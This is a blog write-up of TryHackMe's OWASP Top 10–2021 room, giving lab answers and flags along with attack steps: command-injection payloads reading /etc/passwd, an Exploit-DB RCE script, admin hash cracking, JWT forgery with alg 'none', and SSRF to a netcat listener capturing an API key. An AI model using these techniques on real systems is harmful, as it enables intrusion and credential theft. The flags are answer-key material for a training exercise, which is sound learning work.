---
title: OWASP Top 10–2021 | TryHackMe Write-up 
publishDate: '2025-03-30T16:32:56.133Z'
description: >-
  OWASP Top 10–2021 | TryHackMe | Write-up by FarrosFR.
tags: [owasp, tryhackme, write-up]
heroImage: {src: './image.png',color: '#ffffff'}
language: 'en'
---
Here is my article on the walkthrough of free room for [TryHackMe: OWASP TOP 10 - 2021](https://tryhackme.com/room/owasptop102021), which is the final section of the [Web Hacking](https://tryhackme.com/module/web-hacking) module.I wrote this in 2025 and hope it is useful for learning about OWASP TOP 10

## Task 1: Introduction

Here is the list of the Top 10 OWASP 2021 vulnerabilities that will be discussed in this write-up. The source can also be checked at the [OWASP Top Ten Project page](https://owasp.org/www-project-top-ten/):

1. Broken Access Control
2. Cryptographic Failures
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable and Outdated Components
7. Identification and Authentication Failures
8. Software and Data Integrity Failures
9. Security Logging & Monitoring Failures
10. Server-Side Request Forgery (SSRF)

**Read the above.**

> No answer needed

## Task 2: Accessing Machines

To access these machines, you need to either:

1. **Connect using OpenVPN**
2. **Use an in-browser Linux Machine**

**Connect to our network or deploy the AttackBox.**

> No answer needed

## Task 3: 1. Broken Access Control

**Read and understand what broken access control is.**

> No answer needed

## Task 4: Broken Access Control (IDOR Challenge)

**Read and understand how IDOR works.**

> No answer needed

**Deploy the machine and go to** [**http://MACHINEIP**](http://machine_ip/) **— Login with the username noot and the password test1234.**

![alt text](https://cdn-images-1.medium.com/max/800/1*HkL2UpVZpeBHZNNm86tREw.png)

THM Note Server

> No answer needed

**Q1: Look at other users’ notes. What is the flag?**

Change the noteid from 1 to 0.

![alt text](https://cdn-images-1.medium.com/max/800/1*ZmAmlKZckfCBXfuJiwKn3Q.png)

THM Flag

> flag{fivefourthree}

## Task 5: 2. Cryptographic Failures

**Read the introduction to Cryptographic Failures and deploy the machine.**

> No answer needed

## Task 6: Cryptographic Failures (Supporting Material 1)

**Read and understand the supporting material on SQLite Databases.**

> No answer needed

## Task 7: Cryptographic Failures (Supporting Material 2)

Read the supporting material about cracking hashes.

> No answer needed

## Task 8: Cryptographic Failures (Challenge)

It’s now time to put what you’ve learnt into practice! For this challenge, connect to the web application at [http://machine-ip:81/](http://10.10.157.27:81/).

Have a look around the web app. The developer has left themselves a note indicating that there is sensitive data in a specific directory.

**Q1: What is the name of the mentioned directory?**

![alt text](https://cdn-images-1.medium.com/max/800/1*MDMKT0TJ04A4b4EQq5auFg.png)

Web App

Go to the login page.

![alt text](https://cdn-images-1.medium.com/max/800/1*i6EYLO40IMDwWfhZmB0rlA.png)

Login Page

We can view the source code on the web by jumping into the developer tools (Ctrl+Shift+I in Mozilla) to inspect the code.

![alt text](https://cdn-images-1.medium.com/max/800/1*o3DLOjMx0Pb1u7p7c-B6mg.png)

We found this note from the developer with green-colored text.

> /assets

**Q2: Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?**

We are going to the path [https://MACHINEIP:81/assets](https://machine-ip:81/assets).

![alt text](https://cdn-images-1.medium.com/max/800/1*CW6WwPYr41UAOPsvd4AdXA.png)

> webapp.db

**Q3: Use the supporting material to access the sensitive data. What is the password hash of the admin user?**

Download the database from the website, then type `ls -l` in the Downloads directory.

![alt text](https://cdn-images-1.medium.com/max/800/1*XPvoihVcRzjUsmSTzgoVOA.png)

Opens the SQLite command-line interface and connects to the `webapp.db` database with `sqlite3 webapp.db`. Lists all the tables in the database with `.tables` to view the `sessions` and `users` tables. Then, run `PRAGMA table_info(users);` to view the columns. After that, execute the script `SELECT username, password FROM users;` to retrieve specific details about the admin's password.

![alt text](https://cdn-images-1.medium.com/max/800/1*Un8KDRcPYZMlhrJ-cJ1d4Q.png)

> 6eea9b7ef19179a06954edd0f6c05ceb

Crack the hash.  
**Q4: What is the admin’s plaintext password?**

Open the website crackstation.net, then enter the hash and click the ‘Crack Hashes’ button to decrypt the password.

![alt text](https://cdn-images-1.medium.com/max/800/1*So3Ogqma7SmXb0WrQ0u8xg.png)

[crackstation.net](https://crackstation.net/)

> qwertyuiop

**Q5: Log in as the admin. What is the flag?**

![alt text](https://cdn-images-1.medium.com/max/800/1*Uiqj-2eFxi6KDU41_PkuiA.png)

Login Web

![alt text](https://cdn-images-1.medium.com/max/800/1*7OIIBdZqo5JhT0rGKVAi4Q.png)

Flag

> THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}

## Task 9: 3. Injection

**I’ve understood Injection attacks.**

> No answer needed

## Task 10: 3.1. Command Injection

To complete the questions below, navigate to [http://MACHINEIP:82/](http://10.10.46.122:82/) and exploit the cowsay server.

**Q1: What strange text file is in the website’s root directory?**

![alt text](https://cdn-images-1.medium.com/max/800/1*XlpjEWk_6e4dKn6h77JxFQ.png)

[http://MACHINEIP:82](http://MACHINE_IP:82/)

Try to run the script `$(ls)` that can generate the URL path `[http://MACHINE_IP:82/?cow=default&mooing=%24%28ls%29](http://MACHINE_IP:82/?cow=default&mooing=%24%28ls%29)`

![alt text](https://cdn-images-1.medium.com/max/800/1*5Cmj6a6V-y690ooMh2ip_Q.png)

> drpepper.txt

**Q2: How many non-root/non-service/non-daemon users are there?**

You can run this script to check `$(cat /etc/passwd)` or this script for more details to check if any non-root, non-service, or non-daemon users are present: `$(cat /etc/passwd | awk -F: '{if ($3 >= 1000 && $3 < 65534) print $1}' | wc -l)`

![alt text](https://cdn-images-1.medium.com/max/800/1*Sq02iS8JNU1b_4Qi8CFLTQ.png)

> 0

**Q3: What user is this app running as?**

Start with the command recommended by TryHackMe: `$(whoami)`

![alt text](https://cdn-images-1.medium.com/max/800/1*E30-xfZG0Na0mHL4asFgGQ.png)

$(whoami)

> apache

**Q4: What is the user’s shell set as?**

Run this script: `$(awk -F: '$3 >= 1000' /etc/passwd).` This script uses `awk` to filter and display user entries from the `/etc/passwd` file where the user's UID (User ID) is greater than or equal to 1000. UIDs starting from 1000 are typically assigned to non-system (regular) users.

![alt text](https://cdn-images-1.medium.com/max/800/1*rtXeFVWNY92CPZJEZ_L_-Q.png)

> /sbin/nologin

**Q5: What version of Alpine Linux is running?**

You can run this script to check the version of Linux: `$(cat /etc/os-release)`

![alt text](https://cdn-images-1.medium.com/max/800/1*71bsxRyMCRvWBKmp5tU8Mg.png)

> 3.16.0

## Task 11: 4. Insecure Design

**Try to reset joseph’s password. Keep in mind the method used by the site to validate if you are indeed joseph.**

![alt text](https://cdn-images-1.medium.com/max/800/1*_cCNBsHCnDP21rxeQBH6yw.png)

login

> No answer needed

**Q1: What is the value of the flag in joseph’s account?**

Try resetting the password.

![alt text](https://cdn-images-1.medium.com/max/800/1*R2579B0KgF_EtMQ0vDZBhg.png)

reset password

There are so many possible answers to the security question here.

![alt text](https://cdn-images-1.medium.com/max/800/1*fS9SpmJYkx9_0Ahi79PgCA.png)

secure question

Found the correct answer to the color question, which is ‘green.’

![alt text](https://cdn-images-1.medium.com/max/800/1*7HH_hHcQ47-1rB9wjbtdJQ.png)

secure question pass

![alt text](https://cdn-images-1.medium.com/max/800/1*p4tOLVaU3Dzpi7UhlBIlcw.png)

We can try logging in after that and search for the flag

![alt text](https://cdn-images-1.medium.com/max/800/1*5Bo2NHNnxvGIuwUnGd78Fg.png)

> THM{Not3venc4tzc0uldsav3U!}

## Task 12: 5. Security Misconfiguration

**Navigate to** [**http://MACHINEIP:86/console**](http://10.10.6.94:86/console) **to access the Werkzeug console.**

![alt text](https://cdn-images-1.medium.com/max/800/1*1pVq7eVopcbZo-u639Rj1g.png)

Werkzeug Console

> No answer needed

Use the Werkzeug console to run the following Python code to execute the `ls -l` command on the server:

import os; print(os.popen("ls -l").read())

**Q1: What is the database file name (the one with the .db extension) in the current directory?**

![alt text](https://cdn-images-1.medium.com/max/800/1*mna438OC2sxrlJfNtJgQsA.png)

ls -l

> todo.db

**Q2: Modify the code to read the contents of the** `**app.py**` **file, which contains the application's source code. What is the value of the** `**secret_flag**` **variable in the source code?**

![alt text](https://cdn-images-1.medium.com/max/800/1*63zrzfmfqlNZ5ixddvZRuw.png)

cat app.py

> THM{Justatinymisconfiguration}

## Task 13: 6. Vulnerable and Outdated Components

**Read about the vulnerability.**

> No answer needed

## Task 14: Vulnerable and Outdated Components — Exploit

**Read the above!**

> No answer needed

## Task 15: Vulnerable and Outdated Components — Lab

Navigate to [http://10.10.6.94:84](http://10.10.6.94:84/) where you’ll find a vulnerable application. All the information you need to exploit it can be found online.

![alt text](https://cdn-images-1.medium.com/max/800/1*OIGsFeCEzdOItqupfa5VwQ.png)

**Q1: What is the content of the /opt/flag.txt file?**

First, open [https://www.exploit-db.com/](https://www.exploit-db.com/) to check for vulnerabilities using the keyword ‘book store’ and verify the results.

![alt text](https://cdn-images-1.medium.com/max/800/1*yVUjyj0Qf3jEz3w-rrNf1A.png)

We found this, and then we can download the exploit file to our directory.

Try running the script file `47887.py` with the command `python3 47887.py http://MACHINE_IP:84`, and then use the script as instructed by running `cat /opt/flag.txt`.

![alt text](https://cdn-images-1.medium.com/max/800/1*as-FKA2I_cNf6Shvwkm6gQ.png)

> THM{But1tsn0tmyf4ult!}

## Task 16: 7. Identification and Authentication Failures

**I’ve understood broken authentication mechanisms.**

> No answer needed

## Task 17: Identification and Authentication Failures Practical

**Q1: What is the flag that you found in darren’s account?**

![alt text](https://cdn-images-1.medium.com/max/800/1*UxcqKf6wrzcZkFQhb17PrQ.png)

Try to register with Darren as your username based on the instructions, and then the error message will be displayed.

![alt text](https://cdn-images-1.medium.com/max/800/1*wLVIrJ2Dj387phS0d-1NAA.png)

Let’s try with the user ‘ darren’ (with a space in front of the text).

![alt text](https://cdn-images-1.medium.com/max/800/1*3eFDr50fVbFvV1QAAxU7QQ.png)

![alt text](https://cdn-images-1.medium.com/max/800/1*CsxpVt587ERKs9YZiquWGg.png)

Try to log in as ‘ darren’.

![alt text](https://cdn-images-1.medium.com/max/800/1*_U1vZmwu1l07d6nZxn0LMg.png)

![alt text](https://cdn-images-1.medium.com/max/800/1*0MUlIXS3ECaLS4jFbVbOMw.png)

> fe86079416a21a3c99937fea8874b667

Now try to do the same trick and see if you can log in as **arthur.**

> No answer needed

**Q2: What is the flag that you found in arthur’s account?**

Try the same method to log in as the ‘darren’ user.

> d9ac0f7db4fda460ac3edeb75d75e16e

## Task 18: 8. Software and Data Integrity Failures

**Read the above and continue!**

> No answer needed

## Task 19: Software Integrity Failures

**Q1: What is the SHA-256 hash of** `[**https://code.jquery.com/jquery-1.12.4.min.js**](https://code.jquery.com/jquery-1.12.4.min.js?)`[**?**](https://code.jquery.com/jquery-1.12.4.min.js?)

Open the website [srihash.org](https://www.srihash.org/) and then encrypt the given URL with SHA-256.

![alt text](https://cdn-images-1.medium.com/max/800/1*0fI4sXttJVmTXnV9FjeSPQ.png)

## Task 20: Data Integrity Failures

**Q1: Try logging into the application as guest. What is guest’s account password?**

![alt text](https://cdn-images-1.medium.com/max/800/1*DJRdTF_RwQgExeXZDVicog.png)

MACHINEIP:8089

Try to log in with the username: guest

![alt text](https://cdn-images-1.medium.com/max/800/1*VpF3Ws1RVKrvJV2AUZMLrw.png)

![alt text](https://cdn-images-1.medium.com/max/800/1*0EWDaKUAh0sxV4djSDjwIQ.png)

> guest

If your login was successful, you should now have a JWT stored as a cookie in your browser. Press F12 to bring out the Developer Tools.

![alt text](https://cdn-images-1.medium.com/max/800/1*8UdAyQdRvrNiKMBaGc_tAg.png)

Depending on your browser, you will be able to edit cookies from the following tabs:

![alt text](https://cdn-images-1.medium.com/max/800/1*UvQUzhryOH_f7mDs3-kJCQ.png)

**Q2: What is the name of the website’s cookie containing a JWT token?**

> jwt-session

**Q3: What is the flag presented to the admin user?**

We can take the value of ‘jwt-session’: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzQzMjM0NTEzfQ.6pfklEryGyL0S45o8OXn7_8dgC5BZvZLhyY_w_-De0k`. Then, we can extract it into two sections: Header and Payload.

Header: `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.`  
 Payload: `eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzQzMjM0NTEzfQ.`

We can extract them using online base64 encoder/decoder tools, such as this one: [https://appdevtools.com/base64-encoder-decoder](https://appdevtools.com/base64-encoder-decoder), and then transform them into strings:

Header: `{"typ":"JWT","alg":"HS256"}`  
 Payload: `{"username":"guest","exp":1743234513}`

Next, change “HS256” to “none” and “guest” to “admin”, and then convert them back into base64:

Header: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=`  
 Payload: `eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzQzMjM0NTEzfQ==`

Finally, concatenate them using a period (`.`) delimiter to form the following version, which can be copied and pasted into the web developer:

`eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzQzMjM0NTEzfQ==`

![alt text](https://cdn-images-1.medium.com/max/800/1*eacJn-pEQ5FC0qProQv72w.png)

> THM{Donttakecookiesfromstrangers}

## Task 21: 9. Security Logging and Monitoring Failures

**Q1: What IP address is the attacker using?**

We can see here the login file and know what ip that have unauthorized authentification.

![alt text](https://cdn-images-1.medium.com/max/800/1*tAymkQ0QYo72_oihN3LvBA.png)

> 49.99.13.16

**Q2: What kind of attack is being carried out?**

The attacker attempts to log in by trying different usernames and passwords repeatedly to guess the correct one. We can see multiple unsuccessful login attempts (HTTP 401 Unauthorized) from the same IP address (`49.99.13.16`) with different usernames (`admin`, `administrator`, `anonymous`, `root`).

> Brute Force

## Task 22: 10. Server-Side Request Forgery (SSRF)

**Q1: Explore the website. What is the only host allowed to access the admin area?**

![alt text](https://cdn-images-1.medium.com/max/800/1*uCX-ocRSysev5ywig1bQ_w.png)

Let’s try opening the Admin Area from the menu panel.

![alt text](https://cdn-images-1.medium.com/max/800/1*cIvL6CenOGcRsszdRcbRnA.png)

![alt text](https://cdn-images-1.medium.com/max/800/1*BdI07pgQN_m0ulSUbgi97g.png)

> localhost

**Q2: Check the “Download Resume” button. Where does the server parameter point to?**

Let’s try inspecting the element for the button, and we’ll get the information that it has a parameter pointing to.

![alt text](https://cdn-images-1.medium.com/max/800/1*K0uE_rRLTPUsPaLeu3FTDw.png)

> secure-file-storage.com

**Q3: Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request?**

We can extract the link from the web developer like this: `http://10.10.2.174:8087/download?server=secure-file-storage.com:8087&id=75482342`. Then, we can modify the URL by replacing the server with the IP of the attack box and port 8087.

Before running the modified URL, we need to first execute this script in the terminal to set up the netcat listener:

nc -lvnp 8087

After that, run the modified URL in the browser with the attack box IP:

`[http://10.10.2.174:8087/download?server=10.10.32.61:8087&id=75482342](http://10.10.2.174:8087/download?server=10.10.32.61:8087&id=75482342.)`[.](http://10.10.2.174:8087/download?server=10.10.32.61:8087&id=75482342.)

Then, check the terminal for the listener and capture the flag.

![alt text](https://cdn-images-1.medium.com/max/800/1*akExhJmccLiwC6QBltJjtg.png)

Flag

> THM{HelloImjustanAPIkey}

**Q4: Going the Extra Mile:** There’s a way to use SSRF to gain access to the site’s admin area. Can you find it?

**Note:** You won’t need this flag to progress in the room. You are expected to do some research in order to achieve your goal.

> No answer needed

## Task 23: What Next?

Why not enroll in our [beginner-level pathway](https://tryhackme.com/path/outline/beginner) or [find another room](https://tryhackme.com/hacktivities) to complete?

> No answer needed
